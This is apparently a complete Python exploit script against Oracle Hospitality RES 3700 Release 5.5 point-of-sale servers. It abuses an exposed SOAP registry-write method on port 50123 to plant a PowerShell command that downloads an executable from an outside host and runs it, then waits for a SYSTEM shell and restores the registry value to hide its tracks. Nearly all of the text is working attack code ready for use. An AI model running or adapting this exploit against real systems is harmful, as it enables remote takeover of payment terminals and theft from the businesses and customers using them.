#!/usr/bin/env python

#Author: Walid Faour
#Date: Aug. 3, 2019
#Oracle Hospitality RES 3700 Release 5.5 Exploit
import binascii
import requests
print
print '-------------------------------------------------'
print 'Oracle Hospitality RES 3700 Release 5.5 - Exploit'
print '-------------------------------------------------'
print
IP = raw_input("Enter the IP address: ")
URL = "http://" + IP + ":50123"
def header(body):
	headers = {
		"Content-Type" : "text/xml",
		"User-Agent" : "MDS POS Client",
		"Host" : IP + ":50123",
		"Content-Length" : str(len(body)),
		"Connection" : "Keep-Alive"
		}
	return headers

payload_keyval = "powershell.exe -command \"(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/attacker-5.5.exe','C:\\Windows\\attacker-5.5.exe');Start-Process 'C:\\Windows\\attacker-5.5.exe'\""
original_keyval = "D:\\Micros\\Common\\Bin\\RunDBMS.exe" 
def reg(keyval,keyname):
	body = '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"> \
			<SOAP-ENV:Body xmlns:MCRS-ENV="MCRS-URI"> \
				<MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service> \
				<MCRS-ENV:Method>Reg_SetValue</MCRS-ENV:Method> \
				<MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey> \
				<MCRS-ENV:InputParameters> \
					<Key>SOFTWARE\\Wow6432Node\\MICROS\\3700\\3700d\\RunDBMS</Key> \
					<KeyType>HKEY_LOCAL_MACHINE</KeyType> \
					<vtype>REG_SZ</vtype> \
					<KeyName>' + keyname + '</KeyName> \
					<KeyVal>' + keyval + '</KeyVal> \
					<KOvrWrte>T</KOvrWrte> \
				</MCRS-ENV:InputParameters> \
			</SOAP-ENV:Body> \
		</SOAP-ENV:Envelope>'
	return body

print 'Exploiting Oracle Hospitality RES 3700 at IP address ' + IP + '...'
body1 = reg(payload_keyval,"Executable")
body2 = reg("True","Console")
set_registry1 = requests.post(URL,data=body1,headers=header(body1))
set_registry2 = requests.post(URL,data=body2,headers=header(body2))
pause = raw_input('Press Enter when you acquire a SYSTEM shell: ')
body3 = reg(original_keyval,"Executable")
set_registry3 = requests.post(URL,data=body3,headers=header(body3))
